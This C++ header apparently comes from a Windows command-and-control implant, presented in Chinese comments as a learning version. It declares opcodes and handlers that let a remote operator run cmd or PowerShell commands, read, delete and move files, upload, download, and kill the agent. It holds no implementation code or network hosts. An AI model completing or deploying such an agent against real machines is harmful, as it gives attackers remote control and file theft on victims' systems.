// 文件作用：命令分发器声明：定义命令编号和每个命令处理函数的接口。
#pragma once

#include <windows.h>
#include "Packer.h"
#include "Agent.h"

// 恢复后的学习版命令面：cmd/powershell + 文件 CRUD/upload/download。
// jobs kill / terminate 等非目标功能保留源码实现但不在 dispatcher/UI 中暴露。
#define COMMAND_PS_RUN       43
#define COMMAND_PWD          4
#define COMMAND_CD           8
#define COMMAND_LS           14
#define COMMAND_CAT          24
#define COMMAND_MKDIR        27
#define COMMAND_RM           17
#define COMMAND_CP           12
#define COMMAND_MV           18
// COMMAND_DOWNLOAD (32) is defined in Downloader.h because downloader status
// packets and operator download tasks share the same result stream.
#define COMMAND_UPLOAD       33

// Development-only helpers currently exposed after the target commands.
#define COMMAND_HELLO        0x9001
#define COMMAND_JOBS_KILL    47
#define COMMAND_TERMINATE    10

// Internal upload transport opcode; not exposed as an operator command.
#define COMMAND_SAVEMEMORY   0x2321
#define COMMAND_ERROR        0x1111ffff

class Agent;

// Commander 负责把任务 opcode 分派到具体命令处理函数。
class Commander
{
public:
	Agent* agent;

	// 构造函数保存 Agent 指针。
	Commander(Agent* agent);

	// ProcessCommandTasks 解析任务包并调用对应命令。
	void ProcessCommandTasks(BYTE* recv, ULONG recv_size, Packer* outPacker);

	// CmdCat 读取文件内容。
	void CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdCd 切换工作目录。
	void CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdCp 复制文件。
	void CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdDownload 创建文件下载任务。
	void CmdDownload(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdHello 返回测试文本。
	void CmdHello(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdJobsKill 终止后台 job。
	void CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdLs 列目录。
	void CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdMkdir 创建目录。
	void CmdMkdir(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdMv 移动或重命名文件。
	void CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdPsRun 启动子进程执行命令。
	void CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdPwd 返回当前目录。
	void CmdPwd(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdRm 删除文件或目录。
	void CmdRm(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdTerminate 让 agent 退出。
	void CmdTerminate(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdUpload 写入服务端上传的文件。
	void CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// CmdSaveMemory 保存上传分片。
	void CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker);
	// Exit 打包退出响应并停止 agent。
	void Exit(Packer* outPacker);

	// operator new 走自定义内存分配。
	static void* operator new(size_t sz);
	// operator delete 走自定义内存释放。
	static void operator delete(void* p) noexcept;
};
